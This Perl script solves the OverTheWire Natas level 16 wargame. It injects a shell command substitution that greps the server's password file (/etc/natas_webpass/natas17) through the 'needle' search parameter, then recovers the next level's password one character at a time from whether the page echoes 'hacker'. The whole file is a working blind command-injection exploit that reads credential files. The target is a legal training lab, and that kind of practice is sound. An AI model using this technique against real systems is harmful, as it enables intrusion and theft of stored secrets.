#!/usr/bin/env perl
use strict;
use warnings;
use v5.16.3;

use Carp qw/ confess /;
use URI;
use HTTP::Tiny 0.034;

my $host = 'natas16.natas.labs.overthewire.org';
my $uri  = URI->new(sprintf q{http://%s:%s@%s/index.php}, 'natas16', $ARGV[0], $host);
my $u = HTTP::Tiny->new(
    timeout => 5,
    default_headers => { Host => $host },
);

my $inject = '$(grep -E ^%s /etc/natas_webpass/natas17)hacker';
my $pw_so_far = '';
local $SIG{INT} = sub { print "\rPassword so far is: $pw_so_far\n"; exit; };

sub response_to_boolean {
    my $r = shift;

    if (!$r->{success}) {
        use Data::Dumper;
        confess Dumper $r;
    }
    elsif ($r->{content} =~ m/^hacker$/m) {
        return 0;
    }
    else {
        return 1;
    }

}
sub guess_next_char {
    CHAR:
    foreach my $char ('a'..'z', 'A'..'Z', 0..9) {
        print "\rGuessing ${pw_so_far}${char}";
        $uri->query_form({ needle => sprintf($inject, $pw_so_far . $char) });

        my $r = $u->get($uri);
        if ( response_to_boolean($r) ) {
            return $char;
        }
        else {
            next CHAR;
        }
    }
    confess "Couldn't guess next char; password so far is $pw_so_far";
}

STDOUT->autoflush(1);
foreach my $pos (0..31) {
    $pw_so_far .= guess_next_char();
}

say "\rPassword is $pw_so_far";
